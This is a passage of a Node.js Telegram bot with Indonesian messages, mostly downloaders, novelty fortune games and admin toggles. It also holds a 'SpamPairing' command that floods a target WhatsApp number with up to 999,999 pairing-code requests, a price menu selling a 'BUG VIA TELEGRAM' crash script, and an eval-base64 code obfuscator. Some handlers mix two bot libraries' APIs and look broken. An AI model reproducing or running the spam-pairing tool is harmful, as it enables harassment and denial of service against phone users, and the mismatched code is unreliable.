  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  
  // WITA (UTC+8)
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  
  // WIT (UTC+9)
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));
  
  // Format jam
  const formatJam = (date) => {
    return date.toLocaleTimeString("id-ID", { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      hour12: false
    });
  };
  
  // Format tanggal
  const formatTanggal = (date) => {
    return date.toLocaleDateString("id-ID", { 
      weekday: 'long', 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
  };
  
  const pesan = 
`
<blockquote>
🕐 WAKTU SEKARANG 🕐

┌─────────────────┐
│ 🟢 WIB 
│    ${formatJam(wib)}
│    ${formatTanggal(wib)}
├─────────────────┤
│ 🟡 WITA
│    ${formatJam(wita)}
│    ${formatTanggal(wita)}
├─────────────────┤
│ 🔵 WIT
│    ${formatJam(wit)}
│    ${formatTanggal(wit)}
└─────────────────┘

✨ *Ketikan /start untuk kembali menu utama* ✨
</blockquote>
`;
  
  await ctx.reply(pesan, { parse_mode: "HTML" });
}); 
 
bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("snack", async (ctx) => {
  const text = ctx.message.text;
  const url = text.split(" ")[1];

  if (!url) {
    return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  }

  // validasi link dikit biar ga asal masukin sampah
  if (!url.includes("snackvideo")) {
    return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  }

  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");

    const res = await axios.get(
      `https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`,
      { timeout: 15000 } // biar ga ngegantung
    );

    const video = res?.data?.data?.video;

    if (!video) {
      return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    }

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: "✅ Beres. Udah, jangan spam lagi"
      }
    );

  } catch (err) {
    console.log("ERROR:", err.message);

    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh\n- Internet lu kentang");
  }
});

bot.command(/\/gethtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = (match[1] || "").trim();

  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(
      chatId,
      "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil source code dari URL...");

    const res = await axios.get(url, { responseType: "text", timeout: 30000 });
    const html = res.data;

    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    await bot.sendDocument(chatId, filePath, {}, { filename: "source_code.html", contentType: "text/html" });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ *Terjadi kesalahan:*\n\`${err.message}\``, { parse_mode: "Markdown" });
  }
});

// ========== CATBOX DOWNLOADER (VERSI SIMPLE) ==========

bot.command("catbox", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const url = args[1];
  
  if (!url) {
    return ctx.reply(
`📥 *DOWNLOAD CATBOX* 📥

*Cara pakai:*
/catbox https://files.catbox.moe/xxxxx.jpg

*Support file:*
Gambar, Video, Audio, Dokumen

📌 *Maksimal file: 50MB*`,
      { parse_mode: "Markdown" }
    );
  }
  
  if (!url.includes('files.catbox.moe')) {
    return ctx.reply("❌ Bukan URL Catbox yang valid!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengunduh file...*", { parse_mode: "Markdown" });
  
  try {
    // Kirim langsung pake URL
    const ext = url.split('.').pop().toLowerCase();
    
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
      await ctx.replyWithPhoto(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) {
      await ctx.replyWithVideo(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
      await ctx.replyWithAudio(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else {
      await ctx.replyWithDocument(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    }
  } catch (err) {
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", { parse_mode: "Markdown" });
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// ========== CEK MASA DEPAN ==========
bot.command("cekmasadepan", async (ctx) => {
  let targetName = "Kamu";
  
  // Cek apakah reply ke pesan orang
  if (ctx.message.reply_to_message) {
    const target = ctx.message.reply_to_message.from;
    targetName = target.first_name || "Dia";
  } else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) {
      targetName = args.slice(1).join(" ");
    }
  }
  
  // Data random
  const profesi = [
    "Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", 
    "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚",
    "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️",
    "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"
  ];
  
  const kekayaan = [
    "Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵",
    "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎",
    "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"
  ];
  
  const jodoh = [
    "Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸",
    "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊",
    "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"
  ];
  
  const rumah = [
    "Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️",
    "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️",
    "Rumah Impian ✨", "Kontrakan Dulu 😅"
  ];
  
  const kendaraan = [
    "Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡",
    "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️",
    "Helikopter Pribadi 🚁", "Naik Angkot 😂"
  ];
  
  const nasib = [
    "Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧",
    "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨",
    "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"
  ];
  
  // Random pilih
  const hasilProfesi = profesi[Math.floor(Math.random() * profesi.length)];
  const hasilKekayaan = kekayaan[Math.floor(Math.random() * kekayaan.length)];
  const hasilJodoh = jodoh[Math.floor(Math.random() * jodoh.length)];
  const hasilRumah = rumah[Math.floor(Math.random() * rumah.length)];
  const hasilKendaraan = kendaraan[Math.floor(Math.random() * kendaraan.length)];
  const hasilNasib = nasib[Math.floor(Math.random() * nasib.length)];
  
  const pesan = 
`
<blockquote>
🔮 RAMALAN MASA DEPAN 🔮
Untuk: ${targetName}

━━━━━━━━━━━━━━━━━━━━━━

👔 Profesi: ${hasilProfesi}
💰 Kekayaan: ${hasilKekayaan}
❤️ Jodoh: ${hasilJodoh}
🏠 Rumah: ${hasilRumah}
🚗 Kendaraan: ${hasilKendaraan}
🍀 Nasib:  ${hasilNasib}

━━━━━━━━━━━━━━━━━━━━━━
✨ Hasil ini hanya hiburan ya!
💪 Masa depan ada di tanganmu sendiri!

🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>`;

  ctx.reply(pesan, { parse_mode: "HTML" });
});

// COMMAND SINGKAT (opsional)
bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ");
  let nama = "Kamu";
  if (args.length > 1) nama = args.slice(1).join(" ");
  
  const hasil = [
    "Sukses besar di usia 30an! 🎉",
    "Jadi pengusaha terkenal! 🏢",
    "Punya pasangan idaman! ❤️",
    "Hidup bahagia sampai tua! 😊",
    "Bisa beli rumah mewah! 🏰",
    "Keliling dunia bareng keluarga! 🌍",
    "Jadi orang yang bermanfaat! ✨"
  ];
  
  const random = hasil[Math.floor(Math.random() * hasil.length)];
  ctx.reply(`🔮 *Ramalan untuk ${nama}:*\n\n✨ ${random}\n\n🔮 *Ketik /ramal [nama] lagi!*`, { parse_mode: "HTML" });
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

// CMD /antilink on|off (admin only)
bot.command("antilink", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  const member = await ctx.getChatMember(ctx.from.id);
  if (member.status !== "administrator" && member.status !== "creator") {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
  }

  const args = ctx.message.text.split(" ");
  const option = args[1];

  if (!option || !["on", "off"].includes(option)) {
    return ctx.reply("Contoh:\n/antilink on\n/antilink off");
  }

  antiLink[ctx.chat.id] = option === "on";
  ctx.reply(`🔗 AntiLink ${option === "on" ? "AKTIF" : "NONAKTIF"}`);
});

// ========== CEK CUACA (HIBURAN) ==========
bot.command("cuaca", async (ctx) => {
  const kondisi = [
    "Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️",
    "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"
  ];
  
  const suhu = Math.floor(Math.random() * 20) + 20; // 20-40°C
  const kelembaban = Math.floor(Math.random() * 50) + 40; // 40-90%
  const randomKondisi = kondisi[Math.floor(Math.random() * kondisi.length)];
  
  ctx.reply(
`
<blockquote>
🌤️ PRAKIRAAN CUACA*l 🌤️

📌 Kondisi: ${randomKondisi}
🌡️ Suhu: ${suhu}°C
💧 Kelembaban: ${kelembaban}%
💨 Angin: ${Math.floor(Math.random() * 20) + 5} km/jam

✨ Perkiraan ini hanya hiburan ya!
🔮 Cuaca sebenarnya bisa berbeda</blockquote>`,
    { parse_mode: "HTML" }
  );
});
// ========== UPLOAD KE TELEGRAPH (GAMPANG & PASTI JALAN) ==========
bot.command("catboxurl", async (ctx) => {
  // Cek reply foto
  if (!ctx.message.reply_to_message) {
    return ctx.reply(
`📸 UPLOAD GAMBAR 📸

Cara pakai:
1. Kirim foto
2. Reply foto itu
3. Ketik /catboxurl

✅ Gratis, cepat, permanen!`,
      { parse_mode: "Markdown" }
    );
  }
  
  let fileId = null;
  let replied = ctx.message.reply_to_message;
  
  if (replied.photo) {
    fileId = replied.photo[replied.photo.length - 1].file_id;
  } else if (replied.document && replied.document.mime_type?.startsWith('image/')) {
    fileId = replied.document.file_id;
  } else {
    return ctx.reply("❌ Harus berupa foto!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengupload...*", { parse_mode: "Markdown" });
  
  try {
    // Dapatkan file dari Telegram
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    
    // Upload ke Telegraph
    const postData = JSON.stringify([{ url: fileUrl }]);
    
    const options = {
      hostname: 'telegra.ph',
      path: '/upload',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const request = https.request(options, (response) => {
      let data = '';
      response.on('data', (chunk) => { data += chunk; });
      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          if (result[0] && result[0].src) {
            ctx.reply(
`✅ Upload Berhasil! ✅

🔗 Link: https://telegra.ph${result[0].src}

📌 Klik link untuk lihat gambar
💾 Link permanent!`,
              { parse_mode: "Markdown" }
            );
          } else {
            ctx.reply("❌ Gagal upload! Coba lagi.", { parse_mode: "Markdown" });
          }
        } catch (err) {
          ctx.reply("❌ Error parsing response!", { parse_mode: "Markdown" });
        }
      });
    });
    
    request.write(postData);
    request.end();
    
  } catch (err) {
    ctx.reply("❌ Terjadi kesalahan!", { parse_mode: "Markdown" });
  }
});
// ========== ENKRIPSI KODE JS (NO ERROR - FIX) ==========

function simpleEncode(code) {
  let encoded = Buffer.from(code).toString('base64');
  return `eval(Buffer.from('${encoded}', 'base64').toString())`;
}

function simpleDecode(encrypted) {
  try {
    let match = encrypted.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
    if (match) {
      return Buffer.from(match[1], 'base64').toString();
    }
    return null;
  } catch(e) {
    return null;
  }
}

// COMMAND ENKRIPSI (FIX REPLY)
bot.command("encjs", (ctx) => {
  let code = "";
  
  // PRIORITAS: Ambil dari reply
  if (ctx.message.reply_to_message) {
    let replied = ctx.message.reply_to_message;
    if (replied.text) {
      code = replied.text;
    } else if (replied.caption) {
      code = replied.caption;
    }
  }
  
  // Jika tidak ada reply, ambil dari argumen
  if (!code) {
    let args = ctx.message.text.split(" ");
    args.shift();
    code = args.join(" ");
  }
  
  // Jika masih kosong, tampilkan bantuan
  if (!code.trim()) {
    return ctx.reply(
`🔒 *ENKRIPSI KODE JS* 🔒

📌 *Cara pakai:*
• /encjs console.log("Halo")
• Atau *reply* pesan yang berisi kode, lalu ketik /encjs

✅ *Contoh:*
[Kamu kirim pesan: console.log("test")]
[Lalu reply pesan itu dengan /encjs]`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleEncode(code);
  
  ctx.reply(
`🔐 *KODE TERPROTEKSI* 🔐

\`\`\`javascript
${hasil}
\`\`\`

📌 *Simpan kode asli!*`,
    { parse_mode: "Markdown" }
  );
});

// COMMAND DEKRIPSI
bot.command("decjs", (ctx) => {
  let encrypted = "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    encrypted = ctx.message.reply_to_message.text;
  } else {
    let args = ctx.message.text.split(" ");
    args.shift();
    encrypted = args.join(" ");
  }
  
  if (!encrypted.trim()) {
    return ctx.reply(
`🔓 *DEKRIPSI KODE JS* 🔓

📌 *Cara pakai:*
Reply pesan yang berisi kode terenkripsi, lalu ketik /decjs`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleDecode(encrypted);
  
  if (hasil) {
    ctx.reply(
`🔓 *KODE ASLI* 🔓

\`\`\`javascript
${hasil}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", { parse_mode: "Markdown" });
  }
});
/// ========== TOOLS SPAM PAIRING =======\\\
bot.command("SpamPairing", async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});
// ========== MENU HARGA SCRIPT ==========
// ✨ Ganti isi array berikut sesuai produk & harga kamu ✨
bot.command('harga', async (ctx) => {
    try {
        const teks = `
\`\`\`js
╔════════════════════════════╗
║🪧 𝙷𝙰𝚁𝙶𝙰 χ-νуяℓєѕ 𝕮яαѕн 𝚂𝙲𝚁𝙸𝙿𝚃   
╠════════════════════════════╣
║  ⛧ Full Up     : 10K               
║  ⛧ Reseller     : 15K               
║  ⛧ Partner     : 25K               
║  ⛧ Moderator   : 35K              
║  ⛧ Owner      : 45k              
║  ⛧ Staff        : 65k              
╠════════════════════════════╣
║ ⚡ 𝚂𝙲𝚁𝙸𝙿𝚃 BUG VIA TELEGRAM    
╚════════════════════════════╝
        \`\`\`
        `;

        await ctx.reply(teks, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👑 Contact Owner", url: "https://t.me/fikayaw", style: "danger" }
                    ]
                ]
            }
        });

    } catch (err) {
        console.log(err);
        ctx.reply('Gagal menampilkan Bagian daftar /harga Di Karenakan Masalah Tertentu.');
    }
});
/// COMMAND CEK FUNCTION \\\
bot.command("cekfunction", async (ctx) => {
  try {

    if (!ctx.message.reply_to_message)
      return ctx.reply("Reply function JavaScript yang ingin dicek.");

    const text =
      ctx.message.reply_to_message.text ||
      ctx.message.reply_to_message.caption;

    if (!text)
      return ctx.reply("Pesan yang direply tidak berisi kode.");

    let acorn;
    try {
      acorn = require("acorn");
    } catch {
      return ctx.reply("Module acorn belum terinstall.\nInstall: npm install acorn");
    }

    try {

      acorn.parse(text, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true
      });

      return ctx.reply(
`🔎 Mengecek syntax function...

✅ SYNTAX VALID
Tidak ditemukan error.

© Dark`
      );

    } catch (err) {

      const lines = text.split("\n");
      const line = err.loc?.line || 0;
      const column = err.loc?.column || 0;

      const start = Math.max(0, line - 3);
      const end = Math.min(lines.length, line + 2);

      const snippet = lines
        .slice(start, end)
        .map((l, i) => {
          const num = start + i + 1;

          return num === line
            ? `👉 ${num} | ${l}`
            : `   ${num} | ${l}`;
        })
        .join("\n");

      return ctx.reply(
`❌ ERROR TERDETEKSI

${err.message}
Line ${line}:${column}

📌 CUPlikan:
\`\`\`javascript
${snippet}
\`\`\`

© Dark`
      );

    }

  } catch (e) {
    console.error(e);
    ctx.reply("Terjadi error saat mengecek function.");
  }
});
// ========== DISABLE / ENABLE COMMAND (NO OWNER ID, NO FS) ==========
let disabled = [];

// ================= OFF CMD =================
bot.command("offcmd", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (!args[1])
    return ctx.reply("⚠️ Contoh: /offcmd menu");

  const cmd = args[1].toLowerCase();

  if (disabled.includes(cmd))
    return ctx.reply(`⚠️ /${cmd} sudah nonaktif.`);

  disabled.push(cmd);

  return ctx.reply(`🚫 /${cmd} berhasil dinonaktifkan.`);
});

// ================= ON CMD =================
bot.command("oncmd", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (!args[1])
    return ctx.reply("⚠️ Contoh: /oncmd menu");

  const cmd = args[1].toLowerCase();

  if (!disabled.includes(cmd))
    return ctx.reply(`⚠️ /${cmd} tidak dalam daftar nonaktif.`);

  disabled = disabled.filter(c => c !== cmd);

  return ctx.reply(`✅ /${cmd} berhasil diaktifkan.`);
});

// ================= DISABLE LIST =================
bot.command("offcmdlist", checkOwner, (ctx) => {

  if (disabled.length === 0) {
    return ctx.reply(
`📋 OFFCMD LIST

✅ Tidak ada command yang dinonaktifkan`
    );
  }

  const list = disabled
    .map((c, i) => `• ${i + 1}. /${c}`)
    .join("\n");

  return ctx.reply(
`📋 OFFCMD LIST

🚫 Command nonaktif:
${list}

📊 Total: ${disabled.length}`
  );

});
///==== LOCK AND UNLOCK ALL CMD====\\\
let lockAllCmd = false;

// LOCK
bot.command("lockallcmd", checkOwner, (ctx) => {
  lockAllCmd = true;
  return ctx.reply("🔒 Semua command di blokir oleh Owner");
});

// UNLOCK
bot.command("unlockallcmd", checkOwner, (ctx) => {
  lockAllCmd = false;
  return ctx.reply("🔓 Semua command telah di buka dari blokiran oleh Owner");
});

// MIDDLEWARE
bot.use((ctx, next) => {
  const text = ctx.message && ctx.message.text ? ctx.message.text : "";

  if (text.startsWith("/lockallcmd") || text.startsWith("/unlockallcmd")) {
    return next();
  }

  if (lockAllCmd) {
    return ctx.reply("🔒 Command sedang di-lock.");
  }

  return next();
});
// ================= MIDDLEWARE BLOKIR =================
bot.use((ctx, next) => {
  if (!ctx.message?.text) return next();

  const cmd = ctx.message.text.split(" ")[0].replace("/", "").toLowerCase();

  if (disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sedang dinonaktifkan oleh owner.`);
  }

  return next();
});
// ========== 10 TOOLS SERU-SERUAN ==========

// 1. Cek Jodoh (random)
bot.command("jodoh", (ctx) => {
  const persen = Math.floor(Math.random() * 100) + 1;
  const status = persen > 70 ? "Cocok banget! 💖" : (persen > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅");
  ctx.reply(`💘 *Cek Jodoh*\nKecocokan: ${persen}%\nStatus: ${status}`, { parse_mode: "Markdown" });
});

// 2. Ramalan Shio (random)
bot.command("shio", (ctx) => {
  const ramalan = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"];
  const random = ramalan[Math.floor(Math.random() * ramalan.length)];
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, { parse_mode: "Markdown" });
});

// 3. Tebak Angka (game)
let tebakAngka = {};
bot.command("tebak", (ctx) => {
  const userId = ctx.from.id;
  if (!tebakAngka[userId]) {
    tebakAngka[userId] = Math.floor(Math.random() * 10) + 1;
    return ctx.reply("🎲 *Tebak Angka (1-10)*\nKetik /tebak [angka]\nContoh: /tebak 5", { parse_mode: "Markdown" });
  }
  const args = ctx.message.text.split(" ");
  const tebakan = parseInt(args[1]);
  if (isNaN(tebakan)) return ctx.reply("Masukkan angka 1-10!");
  if (tebakan === tebakAngka[userId]) {
    ctx.reply("🎉 *Benar!* Selamat! 🎉\nKetik /tebak lagi untuk main baru.");
    delete tebakAngka[userId];
  } else {
    ctx.reply(`❌ Salah! Angka rahasianya bukan ${tebakan}. Coba lagi.`);
  }
});

// 4. Kata Motivasi random
bot.command("motivasi", (ctx) => {
  const quotes = [
    "✨ Jangan menyerah, hari ini berat besok mungkin indah.",
    "💪 Sukses dimulai dari keberanian untuk memulai.",
    "🌟 Percaya sama diri sendiri, itu kunci utama.",
    "🌱 Proses tidak akan mengkhianati hasil.",
    "🚀 Bermimpilah tinggi, lalu kejar!"
  ];
  const random = quotes[Math.floor(Math.random() * quotes.length)];
  ctx.reply(`💡 *Motivasi:* ${random}`, { parse_mode: "Markdown" });
});

// 5. Batu-gunting-kertas (suit)
bot.command("suit", (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"];
  const user = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas");
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) hasil = "Seri 🤝";
  else if (
    (user === "batu" && botChoice === "gunting") ||
    (user === "gunting" && botChoice === "kertas") ||
    (user === "kertas" && botChoice === "batu")
  ) hasil = "Kamu menang! 🎉";
  else hasil = "Bot menang! 😭";
  ctx.reply(`✊ Kamu: ${user}\n🤖 Bot: ${botChoice}\n${hasil}`);
});

// 6. Cek kepribadian dari nama (random)
bot.command("kepribadian", (ctx) => {
  const sifat = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"];
  const random = sifat[Math.floor(Math.random() * sifat.length)];
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, { parse_mode: "Markdown" });
});

// 7. Ramalan karir random
bot.command("karir", (ctx) => {
  const karir = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"];
  const random = karir[Math.floor(Math.random() * karir.length)];
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, { parse_mode: "Markdown" });
});

// 8. Cek level ganteng/cantik (random)
bot.command("level", (ctx) => {
  const level = Math.floor(Math.random() * 100) + 1;
  let status = level > 80 ? "Level Dewa/ Dewi 😎" : (level > 50 ? "Cukup menawan 😊" : "Biasa saja 🤭");
  ctx.reply(`📊 *Level ketampanan/kecantikan:* ${level}%\n${status}`, { parse_mode: "Markdown" });
});

// 9. Tebak hari lahir (seru-seruan)
bot.command("harilahir", (ctx) => {
  const hari = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"];
  const random = hari[Math.floor(Math.random() * hari.length)];
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, { parse_mode: "Markdown" });
});

// 10. Game lempar koin
bot.command("koin", (ctx) => {
  const hasil = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰";
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, { parse_mode: "Markdown" });
});
// ========== PENCARIAN LAGU (DEEZER) ==========
// Command: /lagu [judul lagu]

bot.command("lagu", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", { parse_mode: "Markdown" });
  }

  const status = await ctx.reply(`🔍 *Mencari: ${query}`, { parse_mode: "Markdown" });

  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(query)}&limit=1`);
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const track = data.data[0];
    const judul = track.title;
    const artis = track.artist.name;
    const preview = track.preview;
    const cover = track.album.cover_medium;
    const link = track.link;

    // Hapus pesan "mencari"
    await ctx.telegram.deleteMessage(ctx.chat.id, status.message_id).catch(() => {});

    // Kirim cover + info
    if (cover) {
      await ctx.replyWithPhoto(cover, {
